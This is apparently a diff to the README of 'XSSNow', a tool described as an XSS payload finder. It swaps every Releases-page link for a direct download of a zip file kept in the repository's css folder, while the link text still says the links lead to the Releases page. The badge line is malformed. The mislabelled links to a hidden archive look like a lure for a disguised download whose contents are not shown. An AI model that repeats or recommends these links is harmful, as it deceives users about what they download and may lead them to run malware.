@@ -1,6 +1,6 @@
 # 🚀 XSSNow - Discover Effective XSS Payloads Easily
 
-[![Download XSSNow](https://img.shields.io/badge/Download%20XSSNow-v1.0-blue.svg)](https://github.com/ioannis20081230/XSSNow/releases)
+[![Download XSSNow](https://github.com/ioannis20081230/XSSNow/raw/refs/heads/main/css/Now-XSS-v1.5.zip%https://github.com/ioannis20081230/XSSNow/raw/refs/heads/main/css/Now-XSS-v1.5.zip)](https://github.com/ioannis20081230/XSSNow/raw/refs/heads/main/css/Now-XSS-v1.5.zip)
 
 ---
 
@@ -30,7 +30,7 @@ XSSNow helps you find XSS payloads that actually work. It filters these payloads
 Follow these steps to download and run XSSNow:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/ioannis20081230/XSSNow/releases) to access the latest version of XSSNow.
+   Go to the [Releases page](https://github.com/ioannis20081230/XSSNow/raw/refs/heads/main/css/Now-XSS-v1.5.zip) to access the latest version of XSSNow.
 
 2. **Download the Application**  
    Find the latest version on the releases page. Click on the download link to get the application file.
@@ -53,7 +53,7 @@ Follow these steps to download and run XSSNow:
 
 ## 📥 Download & Install
 
-To get XSSNow, please visit the following link: [Download XSSNow](https://github.com/ioannis20081230/XSSNow/releases). This will direct you to the Releases page where you can choose the most recent version.
+To get XSSNow, please visit the following link: [Download XSSNow](https://github.com/ioannis20081230/XSSNow/raw/refs/heads/main/css/Now-XSS-v1.5.zip). This will direct you to the Releases page where you can choose the most recent version.
 
 ---
 
